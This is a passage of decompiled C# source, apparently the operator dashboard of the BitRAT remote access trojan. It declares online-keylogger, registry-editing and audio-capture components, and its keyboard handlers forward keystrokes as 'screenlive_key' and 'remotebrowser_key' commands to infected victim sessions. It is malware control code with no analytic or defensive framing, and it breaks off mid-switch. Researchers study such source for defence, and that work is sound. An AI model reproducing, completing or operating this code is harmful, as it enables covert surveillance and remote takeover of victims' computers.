﻿using BitRAT;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NAudio.Lame;
using NAudio.Wave;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using VisualPlus.Enumerators;
using VisualPlus.Toolkit.Controls.Interactivity;
using VisualPlus.Toolkit.Controls.Layout;
using Zeroit.Framework.Progress;

[DesignerGenerated]
public sealed class fDashboard : Form
{
    private IContainer icontainer_0;
    private MenuStrip menuStrip_0;
    private ToolStripMenuItem toolStripMenuItem_0;
    private ToolStripMenuItem toolStripMenuItem_1;
    private ContextMenuStrip contextMenuStrip_0;
    private ToolStripMenuItem toolStripMenuItem_2;
    private ToolStripSeparator toolStripSeparator_0;
    private ToolStripMenuItem toolStripMenuItem_3;
    private ToolStripMenuItem toolStripMenuItem_4;
    private ToolStripMenuItem toolStripMenuItem_5;
    private TabControl tabControl_0;
    private TabPage tabPage_0;
    private TabPage tabPage_1;
    private PictureBox pictureBox_0;
    private Label label_0;
    private ToolStripMenuItem toolStripMenuItem_6;
    private ToolStripMenuItem toolStripMenuItem_7;
    private TabPage tabPage_2;
    private ContextMenuStrip contextMenuStrip_1;
    private ToolStripMenuItem toolStripMenuItem_8;
    private ToolStripSeparator toolStripSeparator_1;
    private ToolStripMenuItem toolStripMenuItem_9;
    private ToolStripMenuItem toolStripMenuItem_10;
    private ToolStripSeparator toolStripSeparator_2;
    private ToolStripMenuItem toolStripMenuItem_11;
    private ToolStripMenuItem toolStripMenuItem_12;
    private ToolStripMenuItem toolStripMenuItem_13;
    private ToolStripMenuItem toolStripMenuItem_14;
    private ToolStripMenuItem toolStripMenuItem_15;
    private ToolStripMenuItem toolStripMenuItem_16;
    private ToolStripMenuItem toolStripMenuItem_17;
    private ToolStripMenuItem toolStripMenuItem_18;
    private ToolStripMenuItem toolStripMenuItem_19;
    private ToolStripSeparator toolStripSeparator_3;
    private ToolStripSeparator toolStripSeparator_4;
    private ToolStripMenuItem toolStripMenuItem_20;
    private TabPage tabPage_3;
    private ContextMenuStrip contextMenuStrip_2;
    private ToolStripMenuItem toolStripMenuItem_21;
    private GClass7 gclass7_0;
    private GClass7 gclass7_1;
    private Label label_1;
    private ComboBox comboBox_0;
    private Label label_2;
    private VisualButton visualButton_0;
    private ComboBox comboBox_1;
    private Label label_3;
    private Label label_4;
    private CheckBox checkBox_0;
    private CheckBox checkBox_1;
    private RadioButton radioButton_0;
    private RadioButton radioButton_1;
    private ContextMenuStrip contextMenuStrip_3;
    private ToolStripMenuItem toolStripMenuItem_22;
    private ToolStripSeparator toolStripSeparator_5;
    private ToolStripMenuItem toolStripMenuItem_23;
    private ContextMenuStrip contextMenuStrip_4;
    private ToolStripMenuItem toolStripMenuItem_24;
    private ToolStripSeparator toolStripSeparator_6;
    private ToolStripMenuItem toolStripMenuItem_25;
    private ImageList imageList_0;
    private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_0;
    private StatusStrip statusStrip_0;
    private ToolStripStatusLabel toolStripStatusLabel_0;
    private ToolStripStatusLabel toolStripStatusLabel_1;
    private ToolStripStatusLabel toolStripStatusLabel_2;
    private ToolStripStatusLabel toolStripStatusLabel_3;
    private ToolStripStatusLabel toolStripStatusLabel_4;
    private ToolStripProgressBar toolStripProgressBar_0;
    private ToolStripMenuItem toolStripMenuItem_26;
    private ToolStripMenuItem toolStripMenuItem_27;
    private ToolStripSeparator toolStripSeparator_7;
    private ToolStripSeparator toolStripSeparator_8;
    private ToolStripMenuItem toolStripMenuItem_28;
    private ToolStripMenuItem toolStripMenuItem_29;
    private ToolStripMenuItem toolStripMenuItem_30;
    private ToolStripMenuItem toolStripMenuItem_31;
    private ToolStripMenuItem toolStripMenuItem_32;
    private ToolStripSeparator toolStripSeparator_9;
    private Panel panel_0;
    private Label label_5;
    private ZeroitProgressBarNormal zeroitProgressBarNormal_0;
    private Label label_6;
    private Label label_7;
    private Label label_8;
    private ToolStripMenuItem toolStripMenuItem_33;
    private ToolStripMenuItem toolStripMenuItem_34;
    private ToolStripMenuItem toolStripMenuItem_35;
    private ToolStripMenuItem toolStripMenuItem_36;
    private ToolStripSeparator toolStripSeparator_10;
    private ToolStripMenuItem toolStripMenuItem_37;
    private ToolStripMenuItem toolStripMenuItem_38;
    private ToolStripMenuItem toolStripMenuItem_39;
    private ToolStripMenuItem toolStripMenuItem_40;
    private ToolStripMenuItem toolStripMenuItem_41;
    private ToolStripSeparator toolStripSeparator_11;
    private ToolStripMenuItem toolStripMenuItem_42;
    private ToolStripMenuItem toolStripMenuItem_43;
    private ToolStripMenuItem toolStripMenuItem_44;
    private ToolStripMenuItem toolStripMenuItem_45;
    private ToolStripMenuItem toolStripMenuItem_46;
    private ToolStripMenuItem toolStripMenuItem_47;
    private ToolStripMenuItem toolStripMenuItem_48;
    private Panel panel_1;
    private Label label_9;
    private Label label_10;
    private Label label_11;
    private Label label_12;
    private ZeroitProgressBarNormal zeroitProgressBarNormal_1;
    private ToolStripMenuItem toolStripMenuItem_49;
    private ToolStripMenuItem toolStripMenuItem_50;
    private ToolStripMenuItem toolStripMenuItem_51;
    private ToolStripMenuItem toolStripMenuItem_52;
    private ToolStripMenuItem toolStripMenuItem_53;
    private ToolStripMenuItem toolStripMenuItem_54;
    private ToolStripMenuItem toolStripMenuItem_55;
    private ToolStripMenuItem toolStripMenuItem_56;
    private ToolStripMenuItem toolStripMenuItem_57;
    private ToolStripMenuItem toolStripMenuItem_58;
    private ToolStripMenuItem toolStripMenuItem_59;
    private ToolStripMenuItem toolStripMenuItem_60;
    private ToolStripMenuItem toolStripMenuItem_61;
    private ToolStripMenuItem toolStripMenuItem_62;
    private ToolStripSeparator toolStripSeparator_12;
    private CheckBox checkBox_2;
    private PictureBox pictureBox_1;
    private ComboBox comboBox_2;
    private TabPage tabPage_4;
    private Label label_13;
    private Label label_14;
    private VisualButton visualButton_1;
    private Label label_15;
    private VisualButton visualButton_2;
    private PictureBox pictureBox_2;
    private ToolStripMenuItem toolStripMenuItem_63;
    private ComboBox comboBox_3;
    private TabPage tabPage_5;
    private ToolStripMenuItem toolStripMenuItem_64;
    private ToolStripMenuItem toolStripMenuItem_65;
    private ToolStripSeparator toolStripSeparator_13;
    private ToolStripMenuItem toolStripMenuItem_66;
    private RichTextBox richTextBox_0;
    private BackgroundWorker backgroundWorker_0;
    private TabPage tabPage_6;
    private RichTextBox richTextBox_1;
    private Timer timer_0;
    private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_1;
    private CheckBox checkBox_3;
    private ToolStripMenuItem toolStripMenuItem_67;
    private ToolStripMenuItem toolStripMenuItem_68;
    private ToolStripMenuItem toolStripMenuItem_69;
    private TabPage tabPage_7;
    private Label label_16;
    private ComboBox comboBox_4;
    private Label label_17;
    private StatusStrip statusStrip_1;
    private ToolStripStatusLabel toolStripStatusLabel_5;
    private ToolStripStatusLabel toolStripStatusLabel_6;
    private ToolStripStatusLabel toolStripStatusLabel_7;
    private GClass7 gclass7_2;
    private Label label_18;
    private ComboBox comboBox_5;
    private Label label_19;
    private ToolStripMenuItem toolStripMenuItem_70;
    private ComboBox comboBox_6;
    private Label label_20;
    private CheckBox checkBox_4;
    private ContextMenuStrip contextMenuStrip_5;
    private ToolStripMenuItem toolStripMenuItem_71;
    private ToolStripSeparator toolStripSeparator_14;
    private ToolStripMenuItem toolStripMenuItem_72;
    private SaveFileDialog saveFileDialog_0;
    private Timer timer_1;
    private ToolStripMenuItem toolStripMenuItem_73;
    private ToolStripSeparator toolStripSeparator_15;
    private ToolStripMenuItem toolStripMenuItem_74;
    private TabPage tabPage_8;
    private RichTextBox richTextBox_2;
    private ToolStripMenuItem toolStripMenuItem_75;
    private ToolStripMenuItem toolStripMenuItem_76;
    private TabPage tabPage_9;
    private ContextMenuStrip contextMenuStrip_6;
    private ToolStripMenuItem toolStripMenuItem_77;
    private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_2;
    private ToolStripSeparator toolStripSeparator_16;
    private ToolStripMenuItem toolStripMenuItem_78;
    private ToolStripMenuItem toolStripMenuItem_79;
    private ToolStripMenuItem toolStripMenuItem_80;
    private ToolStripMenuItem toolStripMenuItem_81;
    private ToolStripSeparator toolStripSeparator_17;
    private ToolStripMenuItem toolStripMenuItem_82;
    private ToolStripMenuItem toolStripMenuItem_83;
    private ToolStripMenuItem toolStripMenuItem_84;
    private ToolStripMenuItem toolStripMenuItem_85;
    private Label label_21;
    private GClass7 gclass7_3;
    private ContextMenuStrip contextMenuStrip_7;
    private ToolStripMenuItem toolStripMenuItem_86;
    private ToolStripMenuItem toolStripMenuItem_87;
    private StatusStrip statusStrip_2;
    private ToolStripStatusLabel toolStripStatusLabel_8;
    private ToolStripStatusLabel toolStripStatusLabel_9;
    private ToolStripStatusLabel toolStripStatusLabel_10;
    private ToolStripStatusLabel toolStripStatusLabel_11;
    private ToolStripStatusLabel toolStripStatusLabel_12;
    private ToolStripProgressBar toolStripProgressBar_1;
    private ToolStripMenuItem toolStripMenuItem_88;
    private ToolStripMenuItem toolStripMenuItem_89;
    private ToolStripMenuItem toolStripMenuItem_90;
    private TabPage tabPage_10;
    private GClass7 gclass7_4;
    private ContextMenuStrip contextMenuStrip_8;
    private ToolStripMenuItem toolStripMenuItem_91;
    private ToolStripSeparator toolStripSeparator_18;
    private ToolStripMenuItem toolStripMenuItem_92;
    private ToolStripMenuItem toolStripMenuItem_93;
    private ToolStripSeparator toolStripSeparator_19;
    private ToolStripMenuItem toolStripMenuItem_94;
    private ToolStripMenuItem toolStripMenuItem_95;
    private ToolStripSeparator toolStripSeparator_20;
    private ToolStripMenuItem toolStripMenuItem_96;
    private ToolStripSeparator toolStripSeparator_21;
    private ToolStripSeparator toolStripSeparator_22;
    private ToolStripStatusLabel toolStripStatusLabel_13;
    private Button button_0;
    private Button button_1;
    private Button button_2;
    private Button button_3;
    private ComboBox comboBox_7;
    private ToolStripMenuItem toolStripMenuItem_97;
    private ToolStripMenuItem toolStripMenuItem_98;
    private TabPage tabPage_11;
    private Label label_22;
    private PictureBox pictureBox_3;
    private RichTextBox richTextBox_3;
    private StatusStrip statusStrip_3;
    private ToolStripStatusLabel toolStripStatusLabel_14;
    private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_3;
    private ZeroitProgressIndicator zeroitProgressIndicator_0;
    private StatusStrip statusStrip_4;
    private ToolStripStatusLabel toolStripStatusLabel_15;
    private ToolStripStatusLabel toolStripStatusLabel_16;
    private StatusStrip statusStrip_5;
    private ToolStripStatusLabel toolStripStatusLabel_17;
    private ToolStripStatusLabel toolStripStatusLabel_18;
    private ToolStripStatusLabel toolStripStatusLabel_19;
    private ToolStripStatusLabel toolStripStatusLabel_20;
    private ToolStripProgressBar toolStripProgressBar_2;
    private StatusStrip statusStrip_6;
    private ToolStripStatusLabel toolStripStatusLabel_21;
    private ToolStripStatusLabel toolStripStatusLabel_22;
    private ToolStripStatusLabel toolStripStatusLabel_23;
    private ToolStripStatusLabel toolStripStatusLabel_24;
    private ToolStripStatusLabel toolStripStatusLabel_25;
    private ToolStripProgressBar toolStripProgressBar_3;
    private ZeroitProgressIndicator zeroitProgressIndicator_1;
    private RichTextBox richTextBox_4;
    private ZeroitProgressIndicator zeroitProgressIndicator_2;
    private Label label_23;
    private Label label_24;
    private Button button_4;
    private TabPage tabPage_12;
    private ToolStripMenuItem toolStripMenuItem_99;
    private ContextMenuStrip contextMenuStrip_9;
    private ToolStripMenuItem toolStripMenuItem_100;
    private ToolStripSeparator toolStripSeparator_23;
    private ToolStripMenuItem toolStripMenuItem_101;
    private ToolStripMenuItem toolStripMenuItem_102;
    private ToolStripSeparator toolStripSeparator_24;
    private ToolStripMenuItem toolStripMenuItem_103;
    private ToolStripSeparator toolStripSeparator_25;
    private StatusStrip statusStrip_7;
    private ToolStripStatusLabel toolStripStatusLabel_26;
    private ToolStripProgressBar toolStripProgressBar_4;
    private ZeroitProgressIndicator zeroitProgressIndicator_3;
    private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_4;
    private GClass7 gclass7_5;
    private GClass7 gclass7_6;
    private ZeroitProgressIndicator zeroitProgressIndicator_4;
    private ZeroitProgressIndicator zeroitProgressIndicator_5;
    private Label label_25;
    private BackgroundWorker backgroundWorker_1;
    private ToolStripMenuItem toolStripMenuItem_104;
    private TabPage tabPage_13;
    private ZeroitProgressIndicator zeroitProgressIndicator_6;
    private StatusStrip statusStrip_8;
    private ToolStripStatusLabel toolStripStatusLabel_27;
    private ToolStripStatusLabel toolStripStatusLabel_28;
    private ToolStripProgressBar toolStripProgressBar_5;
    private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_5;
    private GClass7 gclass7_7;
    private ContextMenuStrip contextMenuStrip_10;
    private ToolStripMenuItem toolStripMenuItem_105;
    private ToolStripSeparator toolStripSeparator_26;
    private ToolStripMenuItem toolStripMenuItem_106;
    private ToolStripMenuItem toolStripMenuItem_107;
    private ToolStripSeparator toolStripSeparator_27;
    private ToolStripMenuItem toolStripMenuItem_108;
    private ToolStripSeparator toolStripSeparator_28;
    private ToolStripMenuItem toolStripMenuItem_109;
    private ToolStripMenuItem toolStripMenuItem_110;
    private ToolStripMenuItem toolStripMenuItem_111;
    private ToolStripMenuItem toolStripMenuItem_112;
    private ToolStripMenuItem toolStripMenuItem_113;
    private ToolStripMenuItem toolStripMenuItem_114;
    private ToolStripSeparator toolStripSeparator_29;
    private ToolStripMenuItem toolStripMenuItem_115;
    private TabPage tabPage_14;
    private ZeroitProgressIndicator zeroitProgressIndicator_7;
    private StatusStrip statusStrip_9;
    private ToolStripStatusLabel toolStripStatusLabel_29;
    private ToolStripProgressBar toolStripProgressBar_6;
    private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_6;
    private GClass7 gclass7_8;
    private ToolStripMenuItem toolStripMenuItem_116;
    private ContextMenuStrip contextMenuStrip_11;
    private ToolStripMenuItem toolStripMenuItem_117;
    private ToolStripSeparator toolStripSeparator_30;
    private ToolStripMenuItem toolStripMenuItem_118;
    private ToolStripMenuItem toolStripMenuItem_119;
    private ToolStripMenuItem toolStripMenuItem_120;
    private ToolStripMenuItem toolStripMenuItem_121;
    private ToolStripMenuItem toolStripMenuItem_122;
    private ToolStripSeparator toolStripSeparator_31;
    private ToolStripMenuItem toolStripMenuItem_123;
    private ToolStripSeparator toolStripSeparator_32;
    private ToolStripMenuItem toolStripMenuItem_124;
    private ToolStripMenuItem toolStripMenuItem_125;
    private ToolStripSeparator toolStripSeparator_33;
    private ToolStripMenuItem toolStripMenuItem_126;
    private ToolStripMenuItem toolStripMenuItem_127;
    private ToolStripSeparator toolStripSeparator_34;
    private ToolStripMenuItem toolStripMenuItem_128;
    private ToolStripStatusLabel toolStripStatusLabel_30;
    private ToolStripStatusLabel toolStripStatusLabel_31;
    private Timer timer_2;
    private ToolStripStatusLabel toolStripStatusLabel_32;
    private ToolStripStatusLabel toolStripStatusLabel_33;
    private ToolStripStatusLabel toolStripStatusLabel_34;
    private ToolStripStatusLabel toolStripStatusLabel_35;
    private CheckBox checkBox_5;
    private PictureBox pictureBox_4;
    private PictureBox pictureBox_5;
    private CheckBox checkBox_6;
    private VisualButton visualButton_3;
    private VisualScrollBar visualScrollBar_0;
    private ToolStripSeparator toolStripSeparator_35;
    private VisualButton visualButton_4;
    private VisualButton visualButton_5;
    private VisualButton visualButton_6;
    private VisualButton visualButton_7;
    private VisualButton visualButton_8;
    private VisualButton visualButton_9;
    private VisualButton visualButton_10;
    private VisualButton visualButton_11;
    private VisualButton visualButton_12;
    private VisualButton visualButton_13;
    private VisualButton visualButton_14;
    private VisualScrollBar visualScrollBar_1;
    private VisualScrollBar visualScrollBar_2;
    private GClass7 gclass7_9;
    private GClass7 gclass7_10;
    private TabPage tabPage_15;
    private Button button_5;
    private Button button_6;
    private Button button_7;
    private Button button_8;
    private StatusStrip statusStrip_10;
    private ToolStripStatusLabel toolStripStatusLabel_36;
    private ToolStripStatusLabel toolStripStatusLabel_37;
    private ToolStripStatusLabel toolStripStatusLabel_38;
    private ToolStripStatusLabel toolStripStatusLabel_39;
    private ToolStripProgressBar toolStripProgressBar_7;
    private VisualButton visualButton_15;
    private ComboBox comboBox_8;
    private GClass7 gclass7_11;
    private GClass7 gclass7_12;
    private ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_7;
    private ZeroitProgressIndicator zeroitProgressIndicator_8;
    private ToolStripMenuItem toolStripMenuItem_129;
    private ContextMenuStrip contextMenuStrip_12;
    private ToolStripMenuItem toolStripMenuItem_130;
    private ToolStripSeparator toolStripSeparator_36;
    private ToolStripMenuItem toolStripMenuItem_131;
    private ContextMenuStrip contextMenuStrip_13;
    private ToolStripMenuItem toolStripMenuItem_132;
    private ToolStripSeparator toolStripSeparator_37;
    private ToolStripMenuItem toolStripMenuItem_133;
    private BackgroundWorker backgroundWorker_2;
    private ToolStripMenuItem toolStripMenuItem_134;
    private TabPage tabPage_16;
    private VisualButton visualButton_16;
    private VisualButton visualButton_17;
    private TextBox textBox_0;
    private Label label_26;
    private TextBox textBox_1;
    private Label label_27;
    private Timer timer_3;
    private Label label_28;
    private VisualButton visualButton_18;
    private VisualButton visualButton_19;
    private VisualButton visualButton_20;
    private VisualButton visualButton_21;
    private VisualButton visualButton_22;
    private PictureBox pictureBox_6;
    private Label label_29;
    private BackgroundWorker backgroundWorker_3;
    private ToolStripMenuItem toolStripMenuItem_135;
    private ToolStripSeparator toolStripSeparator_38;
    private VisualButton visualButton_23;
    private CheckBox checkBox_7;
    public fThumb fThumb_0;
    public fRegAdd fRegAdd_0;
    public string string_0;
    public string string_1;
    public string string_2;
    public string string_3;
    public string string_4;
    public string string_5;
    public TcpClient tcpClient_0;
    public GClass1 gclass1_0;
    public string string_6;
    private string string_7;
    private Collection collection_0;
    private string string_8;
    private Collection collection_1;
    private ConcurrentStack<Class130.Struct19> concurrentStack_0;
    private int int_0;
    private int int_1;
    private int int_2;
    private Class128 class128_0;
    public Point point_0;
    public MouseEventArgs mouseEventArgs_0;
    public object object_0;
    private string string_9;
    private long long_0;
    private bool bool_0;
    private StringBuilder stringBuilder_0;
    private string string_10;
    private string string_11;
    private bool bool_1;
    public fKeylogOnline fKeylogOnline_0;
    private bool bool_2;
    public int int_3;
    public int int_4;
    public ConcurrentStack<RawSourceWaveStream> concurrentStack_1;
    public ConcurrentStack<WaveFormat> concurrentStack_2;
    private ImageList imageList_1;
    private ImageList imageList_2;
    private ImageList imageList_3;
    private int int_5;
    private GClass9 gclass9_0;
    private Process process_0;

    public fDashboard()
    {
        base.Load += new EventHandler(this.fDashboard_Load);
        base.Resize += new EventHandler(this.fDashboard_Resize);
        base.FormClosing += new FormClosingEventHandler(this.fDashboard_FormClosing);
        base.Activated += new EventHandler(this.fDashboard_Activated);
        base.KeyPress += new KeyPressEventHandler(this.fDashboard_KeyPress);
        base.KeyDown += new KeyEventHandler(this.fDashboard_KeyDown);
        this.string_7 = string.Empty;
        this.collection_0 = new Collection();
        this.string_8 = string.Empty;
        this.collection_1 = new Collection();
        this.concurrentStack_0 = new ConcurrentStack<Class130.Struct19>();
        this.stringBuilder_0 = new StringBuilder();
        this.string_10 = string.Empty;
        this.string_11 = string.Empty;
        this.fKeylogOnline_0 = new fKeylogOnline();
        this.concurrentStack_1 = new ConcurrentStack<RawSourceWaveStream>();
        this.concurrentStack_2 = new ConcurrentStack<WaveFormat>();
        this.int_5 = -1;
        this.InitializeComponent();
    }

    [CompilerGenerated]
    private void _Lambda$__2016-0()
    {
        this.method_274();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        if (disposing && (this.icontainer_0 != null))
        {
            this.icontainer_0.Dispose();
        }
    }

    [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    private static extern long DrawMenuBar(long long_1);
    private void fDashboard_Activated(object sender, EventArgs e)
    {
    }

    private void fDashboard_FormClosing(object sender, FormClosingEventArgs e)
    {
        this.method_148();
        e.Cancel = true;
    }

    private void fDashboard_KeyDown(object sender, KeyEventArgs e)
    {
        Class136.Class138 class2;
        int selectedIndex = this.vmethod_18().SelectedIndex;
        if (selectedIndex != 1)
        {
            if (selectedIndex != 8)
            {
                if (selectedIndex != 11)
                {
                    e.Handled = true;
                }
                else if (this.vmethod_464().Bounds.Contains(base.PointToClient(Cursor.Position)) & (Operators.CompareString(this.vmethod_708().Text, "Stop", true) == 0))
                {
                    if ((e.KeyValue >= 0x21) & (e.KeyValue <= 40))
                    {
                        class2 = new Class136.Class138();
                        class2.string_0 = this.string_4;
                        class2.string_1 = "remotebrowser_key|" + Conversions.ToString((int) e.KeyCode);
                        class2.long_0 = 0L;
                        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                        {
                            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                        }
                    }
                    else if (e.KeyValue == 8)
                    {
                        class2 = new Class136.Class138();
                        class2.string_0 = this.string_4;
                        class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString((int) e.KeyCode);
                        class2.long_0 = 0L;
                        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                        {
                            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                        }
                    }
                }
            }
        }
        else if (this.vmethod_94().Checked & (this.vmethod_24().Bounds.Contains(base.PointToClient(Cursor.Position)) | this.vmethod_248().Bounds.Contains(base.PointToClient(Cursor.Position))))
        {
            switch (e.KeyValue)
            {
                case 0x25:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "screenlive_key|" + Convert.ToBase64String(Encoding.UTF8.GetBytes("{LEFT}"));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x26:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "screenlive_key|" + Convert.ToBase64String(Encoding.UTF8.GetBytes("{UP}"));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x27:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "screenlive_key|" + Convert.ToBase64String(Encoding.UTF8.GetBytes("{RIGHT}"));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 40:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "screenlive_key|" + Convert.ToBase64String(Encoding.UTF8.GetBytes("{DOWN}"));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;
            }
        }
    }

    private void fDashboard_KeyPress(object sender, KeyPressEventArgs e)
    {
        Class136.Class138 class2;
        int selectedIndex = this.vmethod_18().SelectedIndex;
        if (selectedIndex == 1)
        {
            if (this.vmethod_94().Checked & (this.vmethod_24().Bounds.Contains(base.PointToClient(Cursor.Position)) | this.vmethod_248().Bounds.Contains(base.PointToClient(Cursor.Position))))
            {
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = "screenlive_key|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(e.KeyChar.ToString()));
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
        else if (selectedIndex == 11)
        {
            int num2 = Strings.Asc(e.KeyChar);
            switch (num2)
            {
                case 0x21:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x22:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x23:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x24:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x25:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x26:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x27:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 40:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x29:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x2a:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x2b:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x2c:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x2d:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x2e:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x2f:
                    class2 = new Class136.Class138();
                    class2.string_0 = this.string_4;
                    class2.string_1 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                    return;

                case 0x30:
                case 0x31:
                case 50:
